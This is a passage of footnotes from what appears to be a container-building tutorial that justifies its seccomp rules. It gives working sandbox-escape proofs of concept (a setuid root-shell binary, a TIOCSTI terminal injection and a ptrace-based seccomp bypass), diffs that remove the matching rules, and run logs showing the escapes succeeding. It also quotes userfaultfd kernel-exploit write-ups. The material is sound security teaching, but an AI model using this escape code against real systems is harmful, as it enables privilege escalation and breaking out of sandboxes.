<code>clock_adjtime</code>, <code>clock_settime</code>, <code>create_module</code>, <code>free_hugepages</code>,
<code>get_kernel_syms</code>, <code>get_mempolicy</code>, <code>getpagesize</code>, <code>kern_features</code>,
<code>kexec_file_load</code>, <code>kexec_load</code>, <code>keyctl</code>, <code>mbind</code>, <code>migrate_pages</code>,
<code>move_pages</code>, <code>nfsservctl</code>, <code>nice</code>, <code>oldfstat</code>, <code>oldlstat</code>,
<code>oldolduname</code>, <code>oldstat</code>, <code>olduname</code>, <code>pciconfig_iobase</code>,
<code>pciconfig_read</code>, <code>pciconfig_write</code>, <code>perfctr</code>, <code>perfmonctl</code>,
<code>pivot_root</code>, <code>ppc_rtas</code>, <code>preadv2</code>, <code>pwritev2</code>, <code>quotactl</code>,
<code>readdir</code>, <code>request_key</code>, <code>set_mempolicy</code>, <code>setup</code>, <code>sgetmask</code>,
<code>sigaction</code>, <code>signal</code>, <code>sigpending</code>, <code>sigprocmask</code>, <code>sigsuspend</code>,
<code>spu_create</code>, <code>spu_run</code>, <code>ssetmask</code>, <code>subpage_prot</code>, <code>swapoff</code>,
<code>swapon</code>, <code>sync_file_range2</code>, <code>sysfs</code>, <code>uselib</code>, <code>userfaultfd</code>,
<code>ustat</code>, <code>utrap_install</code>, <code>vm86</code>, <code>vm86old</code>
</p></div></div>

<div class="footdef"><sup><a id="fn.48" class="footnum" href="#fnr.48">48</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 114: </span><code>self_setuid.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static self_setuid.c -o self_setuid" -*- */
#define _GNU_SOURCE
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

int main (int argc, char **argv)
{
	if (argc == 2 &amp;&amp; !strcmp(argv[1], "shell")) {
		if (setresuid(0, 0, 0)) {
			fprintf(stderr, "++ setresuid(0, 0, 0) failed: %m\n");
			return 1;
		}
		return system("sh");
	} else {
		if (chown(argv[0], 0, 0)) {
			fprintf(stderr, "++ chown failed: %m\n");
			return 1;
		}
		int self_fd = 0;
		if (!(self_fd = open(argv[0], 0))) {
			fprintf(stderr, "++ fopen failed: %m\n");
			return 1;
		}
		if (chmod(argv[0], S_ISUID | S_IXOTH)
		    &amp;&amp; fchmod(self_fd, S_ISUID | S_IXOTH)
		    &amp;&amp; fchmodat(AT_FDCWD, argv[0], S_ISUID | S_IXOTH, 0)) {
			fprintf(stderr, "++ chmod  / fchmod / fchmodat failed: %m\n");
			close(self_fd);
			return 1;
		}
		close(self_fd);
		return 0;
	}
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 115: </span><code>allow_chmod.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..b471a69 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -151,18 +151,6 @@ int syscalls()
 	scmp_filter_ctx ctx = NULL;
 	fprintf(stderr, "=&gt; filtering syscalls...");
 	if (!(ctx = seccomp_init(SCMP_ACT_ALLOW))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
-				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
-				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(unshare), 1,
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./self_setuid
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.EXwjdL...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.  ++ chmod / fchmod / fchmodat failed:
Operation not permitted
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$sudo ./contained.allow_chmod -m . -u 0 -c ./self_setuid
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.35HO0W...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$./self_setuid shell
sh-4.3#whoami
root
sh-4.3# exit
[lizzie@empress l-c-i-500-l]$rm ./self_setuid
</pre></div></div>

<div class="footdef"><sup><a id="fn.49" class="footnum" href="#fnr.49">49</a></sup> <div class="footpara"><p class="footpara">
I heard about this pretty recently because of CVE-2016-7545, an
SELinux bug:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 118: </span><a href="http://www.openwall.com/lists/oss-security/2016/09/25/1"><code>CVE-2016-7545 -- SELinux sandbox escape</code></a> from Federico Bento</label><pre class="src src-text">Hi,

When executing a program via the SELinux sandbox, the nonpriv session
can escape to the parent session by using the TIOCSTI ioctl to push
characters into the terminal's input buffer, allowing an attacker to
escape the sandbox.

$ cat test.c
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

int main()
{
     char *cmd = "id\n";
     while(*cmd)
      ioctl(0, TIOCSTI, cmd++);
     execlp("/bin/id", "id", NULL);
}

$ gcc test.c -o test
$ /bin/sandbox ./test
id
uid=1000 gid=1000 groups=1000
context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
$ id    &lt;------ did not type this
uid=1000(saken) gid=1000(saken) groups=1000(saken)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Bug report:
https://bugzilla.redhat.com/show_bug.cgi?id=1378577

Upstream fix:
https://marc.info/?l=selinux&amp;m=147465160112766&amp;w=2
https://marc.info/?l=selinux&amp;m=147466045909969&amp;w=2
https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b636886af99c0915379

Federico Bento.
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 119: </span><code>tiocsti.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static tiocsti.c -o tiocsti" -*- */
/* adapted from http://www.openwall.com/lists/oss-security/2016/09/25/1 */
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;stdio.h&gt;

int main()
{
     for (char *cmd = "id\n"; *cmd; cmd++) {
	     if (ioctl(STDIN_FILENO, TIOCSTI, cmd)) {
		     fprintf(stderr, "++ ioctl failed: %m\n");
		     return 1;
	     }
     }
     return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 120: </span><code>allow_tiocsti.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..5fb25bd 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -167,8 +167,6 @@ int syscalls()
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ioctl), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, TIOCSTI, TIOCSTI))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./tiocsti 
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.P5QATt...done.
=&gt; trying a user namespace...writing /proc/1819/uid_map...writing
/proc/1819/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.  ++ ioctl failed: Operation not
permitted
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_tiocsti -m . -u 0 -c ./tiocsti 
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.J9mulv...done.
=&gt; trying a user namespace...writing /proc/1865/uid_map...writing
/proc/1865/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
id
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ uid=1000(lizzie) gid=1000(lizzie) groups=1000(lizzie)
</pre></div></div>

<div class="footdef"><sup><a id="fn.50" class="footnum" href="#fnr.50">50</a></sup> <div class="footpara"><p class="footpara">
There's a notion of "user keyrings", that I believe are
user-namespaced, but that's it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 122: </span><a href="http://man7.org/linux/man-pages/man7/keyrings.7.html"><code>man 7 keyrings</code></a></label><pre class="src src-text">	User keyrings
		Each UID known to the kernel has a record that contains
		two  keyrings: The  user keyring  and the  user session
		keyring.  These exist for as  long as the UID record in
		the  kernel exists.   A  link to  the  user keyring  is
		placed in a  new session keyring by  pam_keyinit when a
		new login session is initiated.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.51" class="footnum" href="#fnr.51">51</a></sup> <div class="footpara"><p class="footpara">
<a href="http://man7.org/linux/man-pages/man2/seccomp.2.html"><code>man 2 seccomp</code></a> says:
</p>

<blockquote>
<p>
The seccomp check will not be run again after the tracer is
notified.  (This means that seccomp-based sandboxes must not allow
use of ptrace(2)&#x2013;even of other sandboxed processes&#x2013;without extreme
care; ptracers can use this mechanism to escape from the seccomp
sandbox.)
</p>
</blockquote>

<p class="footpara">
Here's an example (remember that our seccomp profile should prevent
<code>chmod(x, I_SUID)</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 124: </span><code>ptrace_breaks_seccomp.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static ptrace_breaks_seccomp.c -o ptrace_breaks_seccomp" -*- */
#include &lt;sys/stat.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;stddef.h&gt;
#include &lt;sys/syscall.h&gt;

#define MAGIC_SYSCALL 666

int main (int argc, char **argv)
{
	pid_t child = 0;
	switch ((child = fork())) {
	case -1:
		fprintf(stderr, "++ fork failed: %m\n");
		return 1;
	case 0:;
		fprintf(stderr, "++ child stopping itself.\n");
		if (kill(getpid(), SIGSTOP)) {
			fprintf(stderr, "++ kill failed: %m\n");
			return 1;
		}
		fprintf(stderr, "++ child continued\n");
		/* pick an arbitrary syscall number. our tracer will change it to chmod. */
		if (syscall(MAGIC_SYSCALL, argv[0], S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR)) {
			fprintf(stderr, "chmod-via-nanosleep failed: %m\n");
			return 1;
		}
		fprintf(stderr, "++ chmod succeeded, child finished.\n");
		break;
	default:;
		int status = 0;
		if (ptrace(PTRACE_ATTACH,child, NULL, NULL)) {
			fprintf(stderr, "++ ptrace failed: %m\n");
			return 1;
		}
		waitpid(child, &amp;status, 0);
		if (!(status &amp; SIGSTOP)) {
			fprintf(stderr, "++ expected SIGSTOP in child.\n");
			return 1;
		}
		struct user_regs_struct regs = {0};
		while (1) {
			if (ptrace(PTRACE_GETREGS, child, 0, &amp;regs)) {
				fprintf(stderr, "++ getting child registers failed: %m\n");
				return 1;
			}
			if (!(regs.orig_rax == MAGIC_SYSCALL)) {
				if (ptrace(PTRACE_SYSCALL, child, 0, 0)) {
					fprintf(stderr, "++ continuing the process failed.\n");
					return 1;
				}
				waitpid(child, &amp;status, 0);
				if (!(status &amp; SIGTRAP)) {
					fprintf(stderr, "++ expected SIGTRAP in child.\n");
					return 1;
				}
			} else {
				fprintf(stderr, "++ got MAGIC_SYSCALL!\n");
				regs.orig_rax = SYS_chmod;
				if (ptrace(PTRACE_SETREGS, child, 0, &amp;regs)) {
					fprintf(stderr, "++ continuing child failed: %m\n");
					return 1;
				}
				if (ptrace(PTRACE_CONT, child, 0, 0)) {
					fprintf(stderr, "++ continuing child failed: %m\n");
					return 1;
				}
				break;
			}
		}
		waitpid(child, NULL, 0);
		fprintf(stderr, "++ finished waiting.\n");

		break;
	}
	return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 125: </span><code>allow_ptrace.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 2291ecb..42ecbc6 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -173,7 +173,6 @@ int syscalls()
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ptrace), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(mbind), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(migrate_pages), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(move_pages), 0)
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./ptrace_breaks_seccomp 
=&gt; validating Linux version...4.7.6-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.EiZRVH...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ child stopping itself.
++ ptrace failed: Operation not permitted
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_ptrace -m . -u 0 -c ./ptrace_breaks_seccomp 
=&gt; validating Linux version...4.7.6-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.ThyjKm...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ child stopping itself.
++ child continued
++ got MAGIC_SYSCALL!
++ chmod succeeded, child finished.
++ finished waiting.
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ls -lh ptrace_breaks_seccomp 
-rws------ 1 lizzie lizzie 793K Oct 11 14:55 ptrace_breaks_seccomp
</pre>

<p class="footpara">
This seems to have been fixed in June by Kees Cook:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 126: </span><a href="https://lkml.org/lkml/2016/6/9/627"><code>run seccomp after ptrace</code></a> on LKML</label><pre class="src src-text">There has been a long-standing (and documented) issue with seccomp
where ptrace can be used to change a syscall out from under seccomp.
This is a problem for containers and other wider seccomp filtered
environments where ptrace needs to remain available, as it allows
for an escape of the seccomp filter.

Since the ptrace attack surface is available for any allowed syscall,
moving seccomp after ptrace doesn't increase the actually available
attack surface. And this actually improves tracing since, for
example, tracers will be notified of syscall entry before seccomp
sends a SIGSYS, which makes debugging filters much easier.

The per-architecture changes do make one (hopefully small)
semantic change, which is that since ptrace comes first, it may
request a syscall be skipped. Running seccomp after this doesn't
make sense, so if ptrace wants to skip a syscall, it will bail
out early similarly to how seccomp was. This means that skipped
syscalls will not be fed through audit, though that likely means
we're actually avoiding noise this way.

This series first cleans up seccomp to remove the now unneeded
two-phase entry, fixes the SECCOMP_RET_TRACE hole (same as the
ptrace hole above), and then reorders seccomp after ptrace on
each architecture.

Thanks,

-Kees
</pre>
</div>

<p class="footpara">
This patchset made it into the kernel at 4.8. See for example <a href="https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=93e35efb8de45393cf61ed07f7b407629bf698ea">93e35e</a>:
</p>

<pre class="example">
  [lizzie@empress linux-stable]$ git branch --contains 93e35efb8de45393cf61ed07f7b407629bf698ea
  * linux-4.8.y
    master
</pre></div></div>

<div class="footdef"><sup><a id="fn.52" class="footnum" href="#fnr.52">52</a></sup> <div class="footpara"><p class="footpara">
This is, as far as I can tell, only documented in the kernel tree:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 129: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/vm/userfaultfd.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/vm/userfaultfd.txt@c8d2bc</code></a></label><pre class="src src-text">= Userfaultfd =

== Objective ==

Userfaults allow the implementation of on-demand paging from userland
and more generally they allow userland to take control of various
memory page faults, something otherwise only the kernel code could do.

[...]

= API ==

When first opened the userfaultfd must be enabled invoking the
UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API (or
a later API version) which will specify the read/POLLIN protocol
userland intends to speak on the UFFD and the uffdio_api.features
userland requires. The UFFDIO_API ioctl if successful (i.e. if the
requested uffdio_api.api is spoken also by the running kernel and the
requested features are going to be enabled) will return into
uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
respectively all the available features of the read(2) protocol and
the generic ioctl available.

Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl should
be invoked (if present in the returned uffdio_api.ioctls bitmask) to
register a memory range in the userfaultfd by setting the
uffdio_register structure accordingly. The uffdio_register.mode
bitmask will specify to the kernel which kind of faults to track for
the range (UFFDIO_REGISTER_MODE_MISSING would track missing
pages). The UFFDIO_REGISTER ioctl will return the
uffdio_register.ioctls bitmask of ioctls that are suitable to resolve
userfaults on the range registered. Not all ioctls will necessarily be
supported for all memory types depending on the underlying virtual
memory backend (anonymous memory vs tmpfs vs real filebacked
mappings).

Userland can use the uffdio_register.ioctls to manage the virtual
address space in the background (to add or potentially also remove
memory from the userfaultfd registered range). This means a userfault
could be triggering just before userland maps in the background the
user-faulted page.

The primary ioctl to resolve userfaults is UFFDIO_COPY. That
atomically copies a page into the userfault registered range and wakes
up the blocked userfaults (unless uffdio_copy.mode &amp;
UFFDIO_COPY_MODE_DONTWAKE is set). Other ioctl works similarly to
UFFDIO_COPY. They're atomic as in guaranteeing that nothing can see an
half copied page since it'll keep userfaulting until the copy has
finished.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.53" class="footnum" href="#fnr.53">53</a></sup> <div class="footpara"><p class="footpara">
Jann Horn described this to me, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">and linked to his vulnerability and
exploit</a>:
</p>

<blockquote>
<p>
In order to make exploitation more reliable, the attacker should
be able to pause code execution in the kernel between the writability
check of the target file and the actual write operation. This can be
done by abusing the writev() syscall and FUSE: The attacker mounts a
FUSE filesystem that artificially delays read accesses, then mmap()s a
file containing a struct iovec from that FUSE filesystem and passes
the result of mmap() to writev(). (Another way to do this would be to
use the userfaultfd() syscall.)
</p>
</blockquote>

<p class="footpara">
It was also used by <a href="https://cyseclabs.com/blog/cve-2016-6187-heap-off-by-one-exploit">Vitaly Nikolenko in his proof-of-concept for
CVE-2016-6187</a>:
</p>

<blockquote>
<p>
[&#x2026;]
</p>

<p>
If we could overwrite the cleanup function pointer (remember that this
object is now allocated in user space), then we'll have arbitrary code
execution with CPL=0. The only problem is that subprocess_info object
allocation and freeing happens on the same path. One way to modify the
object's function pointer is to somehow suspend the execution before
info-&gt;cleanup)(info) gets called and set the function pointer to our
privilege escalation payload. I could have found other objects of the
same size with two "separate" paths for allocation and function
triggering but I needed a reason to try userfaultfd() and the page
splitting idea.
</p>

<p>
The userfaultfd syscall can be used to handle page faults in user
space. We can allocate a page in user space and set up a handler (as a
separate thread); when this page is accessed either for reading or
writing, execution will be transferred to the user-space handler to
deal with the page fault. There's nothing new here and this was
mentioned by <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">Jann Hornh</a>
</p>

<p>
[&#x2026;].
</p>

<ul class="org-ul">
<li>Allocate two consecutive pages, split the object over these two
pages (as before) and set up the page handler for the second page.</li>
<li>When the user-space PF is triggered by memset, set up another user-space PF handler but for the first page.</li>
<li>The next user-space PF will be triggered when object variables
(located in the first page) get initialised in
call_usermodehelper_setup. At this point, set up another PF for
the second page.</li>
<li>Finally, the last user-space PF handler can modify the cleanup
function pointer (by setting it to our privilege escalation
payload or a ROP chain) and set the path member to 0 (since these
members are all located in the first page and already
initialised).</li>
</ul>

<p>
Setting up user-space PF handlers for already "page-faulted" pages
can be accomplished by munmapping/mapping these pages again and then
passing them to userfaultfd(). The PoC for 4.5.1 can be found
<a href="https://cyseclabs.com/exploits/matreshka.c">here</a>. There's nothing specific to the kernel version though (it
should work on all vulnerable kernels). There's no privilege
escalation payload but the PoC will execute instructions at the
user-space address 0xdeadbeef.
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.54" class="footnum" href="#fnr.54">54</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 131: </span><a href="http://man7.org/linux/man-pages/man2/perf_event_open.2.html"><code>man 2 perf_event_open</code></a></label><pre class="src src-text">    PERF_EVENT_OPEN(2) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

    NAME
            perf_event_open - set up performance monitoring

    SYNOPSIS
            #include &lt;linux/perf_event.h&gt;
            #include &lt;linux/hw_breakpoint.h&gt;

            int perf_event_open(struct perf_event_attr *attr,
                                            pid_t pid, int cpu, int group_fd,
                                            unsigned long flags);

            Note: There  is no glibc  wrapper for this system  call; see
            NOTES.

    DESCRIPTION
            [...]

    Arguments

         The pid and cpu arguments allow specifying which process and
         CPU to monitor:

         pid == 0 and cpu == -1
                 This measures the calling process/thread on any CPU.

         pid == 0 and cpu &gt;= 0
                 This  measures  the  calling process/thread  only  when
                 running on the specified CPU.

         pid &gt; 0 and cpu == -1
                 This measures the specified process/thread on any CPU.

         pid &gt; 0 and cpu &gt;= 0
                 This  measures the  specified process/thread  only when
                 running on the specified CPU.

         pid == -1 and cpu &gt;= 0
                 This  measures all  processes/threads on  the specified
                 CPU.   This  requires  CAP_SYS_ADMIN  capability  or  a
                 /proc/sys/kernel/perf_event_paranoid value of less than
                 1.

         pid == -1 and cpu == -1
                 This setting is invalid and will return an error.
</pre>
</div>

<p class="footpara">
If a pid is specified, the corresponding process is found within the
namespace:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 132: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/events/core.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n9376"><code>kernel/events/core.c:9376@c8d2bc</code></a></label><pre class="src src-C">    /**
     * sys_perf_event_open - open a performance event, associate it to a task/cpu
     *
     * @attr_uptr:  event_id type attributes for monitoring/sampling
     * @pid:                target pid
     * @cpu:                target cpu
     * @group_fd:           group leader event fd
     */
    SYSCALL_DEFINE5(perf_event_open,
                    struct perf_event_attr __user *, attr_uptr,
                    pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
    {
            /* ... */

            if (pid != -1 &amp;&amp; !(flags &amp; PERF_FLAG_PID_CGROUP)) {
                    task = find_lively_task_by_vpid(pid);
                    if (IS_ERR(task)) {
                            err = PTR_ERR(task);
                            goto err_group_fd;
                    }
            }

            /* ... */
    }
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 133: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/events/core.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3621"><code>kernel/events/core.c:3621@c8d2bc</code></a></label><pre class="src src-C">    static struct task_struct *
    find_lively_task_by_vpid(pid_t vpid)
    {
            struct task_struct *task;

            rcu_read_lock();
            if (!vpid)
                    task = current;
            else
                    task = find_task_by_vpid(vpid);
            if (task)
                    get_task_struct(task);
            rcu_read_unlock();

            if (!task)
                    return ERR_PTR(-ESRCH);

            return task;
    }
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 134: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n459"><code>kernel/pid.c:459@c8d2bc</code></a></label><pre class="src src-C">    struct task_struct *find_task_by_vpid(pid_t vnr)
    {
            return find_task_by_pid_ns(vnr, task_active_pid_ns(current));
    }
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.55" class="footnum" href="#fnr.55">55</a></sup> <div class="footpara"><p class="footpara">
The Relevant commit is <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=0161028b7c8aebef64194d3d73e43bc3b53b5c66"><code>0161028</code></a>, whose commit message gives a good
description of the problems:
</p>

<div class="org-src-container">
<pre class="src src-diff">commit 0161028b7c8aebef64194d3d73e43bc3b53b5c66
Author: Andy Lutomirski &lt;redacted&gt;
Date:   Mon May 9 15:48:51 2016 -0700

    perf/core: Change the default paranoia level to 2
    
    Allowing unprivileged kernel profiling lets any user dump follow kernel
    control flow and dump kernel registers.  This most likely allows trivial
    kASLR bypassing, and it may allow other mischief as well.  (Off the top
    of my head, the PERF_SAMPLE_REGS_INTR output during /dev/urandom reads
    could be quite interesting.)
    
    Signed-off-by: Andy Lutomirski &lt;redacted&gt;
    Acked-by: Kees Cook &lt;redacted&gt;
    Signed-off-by: Linus Torvalds &lt;redacted&gt;

diff --git a/Documentation/sysctl/kernel.txt b/Documentation/sysctl/kernel.txt
index 57653a4..fcddfd5 100644
--- a/Documentation/sysctl/kernel.txt
+++ b/Documentation/sysctl/kernel.txt
@@ -645,7 +645,7 @@ allowed to execute.
 perf_event_paranoid:
 
 Controls use of the performance events system by unprivileged
-users (without CAP_SYS_ADMIN).  The default value is 1.
+users (without CAP_SYS_ADMIN).  The default value is 2.
 
  -1: Allow use of (almost) all events by all users
 &gt;=0: Disallow raw tracepoint access by users without CAP_IOC_LOCK
diff --git a/kernel/events/core.c b/kernel/events/core.c
index 4e2ebf6..c0ded24 100644
--- a/kernel/events/core.c
+++ b/kernel/events/core.c
@@ -351,7 +351,7 @@ static struct srcu_struct pmus_srcu;
  *   1 - disallow cpu events for unpriv
  *   2 - disallow kernel profiling for unpriv
  */
-int sysctl_perf_event_paranoid __read_mostly = 1;
+int sysctl_perf_event_paranoid __read_mostly = 2;
 
 /* Minimum for 512 kiB + 1 user control page */
</pre>
</div>

<p class="footpara">
This is included in 4.6:
</p>

<pre class="example">
[lizzie@empress linux]$ git tag --contains 0161028b7c8aebef64194d3d73e43bc3b53b5c66
v4.6
v4.7
v4.7-rc1
v4.7-rc2
v4.7-rc3
v4.7-rc4
v4.7-rc5
v4.7-rc6
v4.7-rc7
v4.8
v4.8-rc1
v4.8-rc2
v4.8-rc3
v4.8-rc4
v4.8-rc5
v4.8-rc6
v4.8-rc7
v4.8-rc8
</pre>

<p class="footpara">
